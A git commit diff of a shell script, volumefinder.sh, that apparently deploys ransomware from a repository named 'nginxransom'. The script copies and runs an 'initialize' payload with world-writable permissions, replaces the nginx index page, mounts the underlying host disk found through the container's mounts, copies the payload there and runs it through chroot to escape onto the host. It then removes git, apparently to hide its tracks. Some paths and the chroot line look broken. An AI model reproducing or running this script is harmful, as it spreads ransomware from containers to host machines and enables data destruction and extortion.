6718ddaeb22756134d8f4ca578ffa9ac21dfac1d
Gönenç <40662677+xeroxpro@users.noreply.github.com>
2023-05-12 19:14:11 +0300

    inside host location-revised-1

--- volumefinder.sh
+++ volumefinder.sh
@@ -3,12 +3,11 @@
 #apt update -y 
 #apt install git -y  
 #git clone https://github.com/xeroxpro/nginxransom.git
-cp -u nginxransom/initialize.txt /usr/bin/initialize && chmod 777 /usr/bin/initialize && ./initialize &  
-cp -u /nginxransom/web/index.html /usr/share/nginx/html/index.html && wait
+cp -u nginxransom/initialize.txt /usr/bin/initialize && cp nginxransom/initialize.txt ../ && chmod 777 /usr/bin/initialize && ./initialize &  
+cp -u /nginxransom/web/index.html /usr/share/nginx/html/index.html && wait && chmod 777 initialize
 diskpart=$(mount | grep   '^/dev/' | grep 'hosts' |  sed 's/ *$//g' | awk  '{print $1}')
 mount $diskpart /mnt/
 cp -u /usr/bin/initialize  mnt/usr/bin/initialize && chmod 777 mnt/usr/bin/initialize 
-chroot mnt/ mnt/usr/bin/initialize ./initialize &
-wait
+chroot mnt/ mnt/usr/bin/ ./initialize &
 apt remove git -y
 
